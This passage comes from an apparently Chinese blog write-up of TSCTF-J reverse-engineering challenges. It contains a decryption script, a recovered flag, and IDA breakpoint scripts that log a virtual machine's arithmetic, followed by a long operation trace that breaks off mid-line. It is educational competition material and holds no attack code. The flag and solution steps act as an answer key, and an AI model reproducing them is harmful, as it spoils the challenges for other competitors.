class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;`&#x27;</span>] \</span><br><span class="line">        + [<span class="string">&#x27;catcat&#x27;</span>] * <span class="number">26</span> + [<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;~&#x27;</span>]</span><br><span class="line">lookup = &#123;ch: i + <span class="number">1</span> <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(qrazy) <span class="keyword">if</span> ch != <span class="string">&#x27;catcat&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> ((x &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((x &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">src_bytes</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(src_bytes) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 3 → 2：先把 arc[1] 的输出补回去，再撤销 nibble swap</span></span><br><span class="line">    D = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    D[<span class="number">1</span>] = swap(<span class="number">114</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n + <span class="number">1</span>):</span><br><span class="line">        D[i] = src_bytes[i - <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    C = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n + <span class="number">1</span>):</span><br><span class="line">        C[i] = swap(D[i])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 2 → 1：逆前缀 XOR</span></span><br><span class="line">    B = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    B[<span class="number">1</span>] = C[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n + <span class="number">1</span>):</span><br><span class="line">        B[i] = C[i] ^ C[i - <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 1：撤销 “+索引 (mod 255)”（注意从 i = 2 开始）</span></span><br><span class="line">    arc = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    arc[<span class="number">1</span>] = B[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n + <span class="number">1</span>):</span><br><span class="line">        val = B[i] - i</span><br><span class="line">        <span class="keyword">while</span> val &lt;= <span class="number">0</span>:</span><br><span class="line">            val += <span class="number">255</span></span><br><span class="line">        arc[i] = val</span><br><span class="line"></span><br><span class="line">    word = <span class="string">&#x27;&#x27;</span>.join(qrazy[idx - <span class="number">1</span>] <span class="keyword">for</span> idx <span class="keyword">in</span> arc[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">return</span> arc[<span class="number">1</span>:], word</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    arc_indices, word = decrypt(src)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;arc indices:&#x27;</span>, arc_indices)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;input word :&#x27;</span>, word)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>TSCTF-J{LET_M3_8E_W1TH_Y0U}</p><h3 id="The-Loom-of-Mirrored-Dreams"><a href="#The-Loom-of-Mirrored-Dreams" class="headerlink" title="The Loom of Mirrored Dreams"></a>The Loom of Mirrored Dreams</h3><p>虚拟机逆向，没有反调，其实很简单</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192146793.png" alt="image-20251013192146793"></p><p>下好断点先</p><p>主逻辑</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192236671.png" alt="image-20251013192236671"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192257545.png" alt="image-20251013192257545"></p><p>其实这种一般都是tea类等 异或，加法，运算较多</p><p>我们在加减乘除那边设好断点dump运算逻辑出来即可</p><p>如add</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192625081.png" alt="image-20251013192625081"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013192646573.png" alt="image-20251013192646573"></p><p>一个add指令</p><p>我们在这下断点，运行到这rdx，rcx已经被赋值</p><p>我们加一下不就知道当时的状态是a &#x3D; d +c 了吗</p><p>如果我们知道所有的状态，不就是知道加密的方法了吗?</p><p>左边edit breakpoint</p><p>为了演示，我在这里用了IDC脚本，下面会用IDApython</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> rcx = GetRegValue(<span class="string">&quot;rcx&quot;</span>);</span><br><span class="line"><span class="keyword">auto</span> rdx = GetRegValue(<span class="string">&quot;rdx&quot;</span>);</span><br><span class="line"><span class="keyword">auto</span> sum = rcx + rdx;</span><br><span class="line">Message(<span class="string">&quot;%X = %X + %X;\n&quot;</span>, sum, rcx, rdx);</span><br></pre></td></tr></table></figure><p>shr:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">value = idc.get_reg_value(<span class="string">&quot;rdx&quot;</span>)        </span><br><span class="line">shift = idc.get_reg_value(<span class="string">&quot;cl&quot;</span>) &amp; <span class="number">0x3F</span>  <span class="comment"># 只保留低 6 bit</span></span><br><span class="line">result = value &gt;&gt; shift</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;value&#125;</span> &gt;&gt; <span class="subst">&#123;shift&#125;</span> = <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>mul</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">rbp   = idc.get_reg_value(<span class="string">&quot;rbp&quot;</span>)</span><br><span class="line">mul_a = idc.get_reg_value(<span class="string">&quot;rax&quot;</span>)             <span class="comment"># [rbp+var_20]</span></span><br><span class="line">mul_b = ida_bytes.get_qword(rbp - <span class="number">0x18</span>)      <span class="comment"># [rbp+var_18]</span></span><br><span class="line">prod  = (mul_a * mul_b) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;mul_a&#125;</span> * <span class="subst">&#123;mul_b&#125;</span> = <span class="subst">&#123;prod&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>xor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">rbp    = idc.get_reg_value(<span class="string">&quot;rbp&quot;</span>)</span><br><span class="line">v5     = idc.get_reg_value(<span class="string">&quot;rax&quot;</span>)          </span><br><span class="line">v4     = ida_bytes.get_qword(rbp - <span class="number">0x18</span>)   </span><br><span class="line">result = (v5 ^ v4) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;v5&#125;</span> ^ <span class="subst">&#123;v4&#125;</span> = <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>sub</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">rbp        = idc.get_reg_value(<span class="string">&quot;rbp&quot;</span>)</span><br><span class="line">minuend    = idc.get_reg_value(<span class="string">&quot;rax&quot;</span>)         <span class="comment"># 被减数</span></span><br><span class="line">subtrahend = ida_bytes.get_qword(rbp - <span class="number">0x18</span>)  <span class="comment"># 减数</span></span><br><span class="line">diff       = (minuend - subtrahend) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;minuend&#125;</span> - <span class="subst">&#123;subtrahend&#125;</span> = <span class="subst">&#123;diff&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>shl</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">rbp     = idc.get_reg_value(<span class="string">&quot;rbp&quot;</span>)</span><br><span class="line">value   = ida_bytes.get_qword(rbp - <span class="number">0x20</span>)</span><br><span class="line">shift   = idc.get_reg_value(<span class="string">&quot;cl&quot;</span>) &amp; <span class="number">0x3F</span></span><br><span class="line">result  = (value &lt;&lt; shift) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;value&#125;</span> &lt;&lt; <span class="subst">&#123;shift&#125;</span> = <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013193218872.png" alt="image-20251013193218872"></p><p>运行即可在下方output发现，我输入的是11111222223333344444555556666677777</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br></pre></td><td class="code"><pre><span class="line">0 * 19 = 0</span><br><span class="line">AB = 0 + AB;</span><br><span class="line">171 ^ 49 = 154</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">1 * 19 = 19</span><br><span class="line">BE = 13 + AB;</span><br><span class="line">190 ^ 49 = 143</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">2 * 19 = 38</span><br><span class="line">D1 = 26 + AB;</span><br><span class="line">209 ^ 49 = 224</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">3 * 19 = 57</span><br><span class="line">E4 = 39 + AB;</span><br><span class="line">228 ^ 49 = 213</span><br><span class="line">4 = 3 + 1;</span><br><span class="line">4 * 19 = 76</span><br><span class="line">F7 = 4C + AB;</span><br><span class="line">247 ^ 49 = 198</span><br><span class="line">5 = 4 + 1;</span><br><span class="line">5 * 19 = 95</span><br><span class="line">10A = 5F + AB;</span><br><span class="line">10 ^ 50 = 56</span><br><span class="line">6 = 5 + 1;</span><br><span class="line">6 * 19 = 114</span><br><span class="line">11D = 72 + AB;</span><br><span class="line">29 ^ 50 = 47</span><br><span class="line">7 = 6 + 1;</span><br><span class="line">7 * 19 = 133</span><br><span class="line">130 = 85 + AB;</span><br><span class="line">48 ^ 50 = 2</span><br><span class="line">8 = 7 + 1;</span><br><span class="line">8 * 19 = 152</span><br><span class="line">143 = 98 + AB;</span><br><span class="line">67 ^ 50 = 113</span><br><span class="line">9 = 8 + 1;</span><br><span class="line">9 * 19 = 171</span><br><span class="line">156 = AB + AB;</span><br><span class="line">86 ^ 50 = 100</span><br><span class="line">A = 9 + 1;</span><br><span class="line">10 * 19 = 190</span><br><span class="line">169 = BE + AB;</span><br><span class="line">105 ^ 51 = 90</span><br><span class="line">B = A + 1;</span><br><span class="line">11 * 19 = 209</span><br><span class="line">17C = D1 + AB;</span><br><span class="line">124 ^ 51 = 79</span><br><span class="line">C = B + 1;</span><br><span class="line">12 * 19 = 228</span><br><span class="line">18F = E4 + AB;</span><br><span class="line">143 ^ 51 = 188</span><br><span class="line">D = C + 1;</span><br><span class="line">13 * 19 = 247</span><br><span class="line">1A2 = F7 + AB;</span><br><span class="line">162 ^ 51 = 145</span><br><span class="line">E = D + 1;</span><br><span class="line">14 * 19 = 266</span><br><span class="line">1B5 = 10A + AB;</span><br><span class="line">181 ^ 51 = 134</span><br><span class="line">F = E + 1;</span><br><span class="line">15 * 19 = 285</span><br><span class="line">1C8 = 11D + AB;</span><br><span class="line">200 ^ 52 = 252</span><br><span class="line">10 = F + 1;</span><br><span class="line">16 * 19 = 304</span><br><span class="line">1DB = 130 + AB;</span><br><span class="line">219 ^ 52 = 239</span><br><span class="line">11 = 10 + 1;</span><br><span class="line">17 * 19 = 323</span><br><span class="line">1EE = 143 + AB;</span><br><span class="line">238 ^ 52 = 218</span><br><span class="line">12 = 11 + 1;</span><br><span class="line">18 * 19 = 342</span><br><span class="line">201 = 156 + AB;</span><br><span class="line">1 ^ 52 = 53</span><br><span class="line">13 = 12 + 1;</span><br><span class="line">19 * 19 = 361</span><br><span class="line">214 = 169 + AB;</span><br><span class="line">20 ^ 52 = 32</span><br><span class="line">14 = 13 + 1;</span><br><span class="line">20 * 19 = 380</span><br><span class="line">227 = 17C + AB;</span><br><span class="line">39 ^ 53 = 18</span><br><span class="line">15 = 14 + 1;</span><br><span class="line">21 * 19 = 399</span><br><span class="line">23A = 18F + AB;</span><br><span class="line">58 ^ 53 = 15</span><br><span class="line">16 = 15 + 1;</span><br><span class="line">22 * 19 = 418</span><br><span class="line">24D = 1A2 + AB;</span><br><span class="line">77 ^ 53 = 120</span><br><span class="line">17 = 16 + 1;</span><br><span class="line">23 * 19 = 437</span><br><span class="line">260 = 1B5 + AB;</span><br><span class="line">96 ^ 53 = 85</span><br><span class="line">18 = 17 + 1;</span><br><span class="line">24 * 19 = 456</span><br><span class="line">273 = 1C8 + AB;</span><br><span class="line">115 ^ 53 = 70</span><br><span class="line">19 = 18 + 1;</span><br><span class="line">25 * 19 = 475</span><br><span class="line">286 = 1DB + AB;</span><br><span class="line">134 ^ 54 = 176</span><br><span class="line">1A = 19 + 1;</span><br><span class="line">26 * 19 = 494</span><br><span class="line">299 = 1EE + AB;</span><br><span class="line">153 ^ 54 = 175</span><br><span class="line">1B = 1A + 1;</span><br><span class="line">27 * 19 = 513</span><br><span class="line">2AC = 201 + AB;</span><br><span class="line">172 ^ 54 = 154</span><br><span class="line">1C = 1B + 1;</span><br><span class="line">28 * 19 = 532</span><br><span class="line">2BF = 214 + AB;</span><br><span class="line">191 ^ 54 = 137</span><br><span class="line">1D = 1C + 1;</span><br><span class="line">29 * 19 = 551</span><br><span class="line">2D2 = 227 + AB;</span><br><span class="line">210 ^ 54 = 228</span><br><span class="line">1E = 1D + 1;</span><br><span class="line">30 * 19 = 570</span><br><span class="line">2E5 = 23A + AB;</span><br><span class="line">229 ^ 55 = 210</span><br><span class="line">1F = 1E + 1;</span><br><span class="line">31 * 19 = 589</span><br><span class="line">2F8 = 24D + AB;</span><br><span class="line">248 ^ 55 = 207</span><br><span class="line">20 = 1F + 1;</span><br><span class="line">32 * 19 = 608</span><br><span class="line">30B = 260 + AB;</span><br><span class="line">11 ^ 55 = 60</span><br><span class="line">21 = 20 + 1;</span><br><span class="line">33 * 19 = 627</span><br><span class="line">31E = 273 + AB;</span><br><span class="line">30 ^ 55 = 41</span><br><span class="line">22 = 21 + 1;</span><br><span class="line">34 * 19 = 646</span><br><span class="line">331 = 286 + AB;</span><br><span class="line">49 ^ 55 = 6</span><br><span class="line">23 = 22 + 1;</span><br><span class="line">154 &gt;&gt; 4 = 9</span><br><span class="line">14 &lt;&lt; 4 = 224</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">143 &gt;&gt; 4 = 8</span><br><span class="line">3 &lt;&lt; 4 = 48</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">224 &gt;&gt; 4 = 14</span><br><span class="line">1 &lt;&lt; 4 = 16</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">213 &gt;&gt; 4 = 13</span><br><span class="line">7 &lt;&lt; 4 = 112</span><br><span class="line">4 = 3 + 1;</span><br><span class="line">198 &gt;&gt; 4 = 12</span><br><span class="line">4 &lt;&lt; 4 = 64</span><br><span class="line">5 = 4 + 1;</span><br><span class="line">56 &gt;&gt; 4 = 3</span><br><span class="line">11 &lt;&lt; 4 = 176</span><br><span class="line">6 = 5 + 1;</span><br><span class="line">47 &gt;&gt; 4 = 2</span><br><span class="line">6 &lt;&lt; 4 = 96</span><br><span class="line">7 = 6 + 1;</span><br><span class="line">2 &gt;&gt; 4 = 0</span><br><span class="line">12 &lt;&lt; 4 = 192</span><br><span class="line">8 = 7 + 1;</span><br><span class="line">113 &gt;&gt; 4 = 7</span><br><span class="line">13 &lt;&lt; 4 = 208</span><br><span class="line">9 = 8 + 1;</span><br><span class="line">100 &gt;&gt; 4 = 6</span><br><span class="line">10 &lt;&lt; 4 = 160</span><br><span class="line">A = 9 + 1;</span><br><span class="line">90 &gt;&gt; 4 = 5</span><br><span class="line">0 &lt;&lt; 4 = 0</span><br><span class="line">B = A + 1;</span><br><span class="line">79 &gt;&gt; 4 = 4</span><br><span class="line">9 &lt;&lt; 4 = 144</span><br><span class="line">C = B + 1;</span><br><span class="line">188 &gt;&gt; 4 = 11</span><br><span class="line">8 &lt;&lt; 4 = 128</span><br><span class="line">D = C + 1;</span><br><span class="line">145 &gt;&gt; 4 = 9</span><br><span class="line">14 &lt;&lt; 4 = 224</span><br><span class="line">E = D + 1;</span><br><span class="line">134 &gt;&gt; 4 = 8</span><br><span class="line">3 &lt;&lt; 4 = 48</span><br><span class="line">F = E + 1;</span><br><span class="line">252 &gt;&gt; 4 = 15</span><br><span class="line">2 &lt;&lt; 4 = 32</span><br><span class="line">10 = F + 1;</span><br><span class="line">239 &gt;&gt; 4 = 14</span><br><span class="line">1 &lt;&lt; 4 = 16</span><br><span class="line">11 = 10 + 1;</span><br><span class="line">218 &gt;&gt; 4 = 13</span><br><span class="line">7 &lt;&lt; 4 = 112</span><br><span class="line">12 = 11 + 1;</span><br><span class="line">53 &gt;&gt; 4 = 3</span><br><span class="line">11 &lt;&lt; 4 = 176</span><br><span class="line">13 = 12 + 1;</span><br><span class="line">32 &gt;&gt; 4 = 2</span><br><span class="line">6 &lt;&lt; 4 = 96</span><br><span class="line">14 = 13 + 1;</span><br><span class="line">18 &gt;&gt; 4 = 1</span><br><span class="line">5 &lt;&lt; 4 = 80</span><br><span class="line">15 = 14 + 1;</span><br><span class="line">15 &gt;&gt; 4 = 0</span><br><span class="line">12 &lt;&lt; 4 = 192</span><br><span class="line">16 = 15 + 1;</span><br><span class="line">120 &gt;&gt; 4 = 7</span><br><span class="line">13 &lt;&lt; 4 = 208</span><br><span class="line">17 = 16 + 1;</span><br><span class="line">85 &gt;&gt; 4 = 5</span><br><span class="line">0 &lt;&lt; 4 = 0</span><br><span class="line">18 = 17 + 1;</span><br><span class="line">70 &gt;&gt; 4 = 4</span><br><span class="line">9 &lt;&lt; 4 = 144</span><br><span class="line">19 = 18 + 1;</span><br><span class="line">176 &gt;&gt; 4 = 11</span><br><span class="line">8 &lt;&lt; 4 = 128</span><br><span class="line">1A = 19 + 1;</span><br><span class="line">175 &gt;&gt; 4 = 10</span><br><span class="line">15 &lt;&lt; 4 = 240</span><br><span class="line">1B = 1A + 1;</span><br><span class="line">154 &gt;&gt; 4 = 9</span><br><span class="line">14 &lt;&lt; 4 = 224</span><br><span class="line">1C = 1B + 1;</span><br><span class="line">137 &gt;&gt; 4 = 8</span><br><span class="line">3 &lt;&lt; 4 = 48</span><br><span class="line">1D = 1C + 1;</span><br><span class="line">228 &gt;&gt; 4 = 14</span><br><span class="line">1 &lt;&lt; 4 = 16</span><br><span class="line">1E = 1D + 1;</span><br><span class="line">210 &gt;&gt; 4 = 13</span><br><span class="line">7 &lt;&lt; 4 = 112</span><br><span class="line">1F = 1E + 1;</span><br><span class="line">207 &gt;&gt; 4 = 12</span><br><span class="line">4 &lt;&lt; 4 = 64</span><br><span class="line">20 = 1F + 1;</span><br><span class="line">60 &gt;&gt; 4 = 3</span><br><span class="line">11 &lt;&lt; 4 = 176</span><br><span class="line">21 = 20 + 1;</span><br><span class="line">41 &gt;&gt; 4 = 2</span><br><span class="line">6 &lt;&lt; 4 = 96</span><br><span class="line">22 = 21 + 1;</span><br><span class="line">6 &gt;&gt; 4 = 0</span><br><span class="line">12 &lt;&lt; 4 = 192</span><br><span class="line">23 = 22 + 1;</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">239 ^ 50 = 221</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">50 ^ 28 = 46</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">28 ^ 112 = 108</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">4 = 3 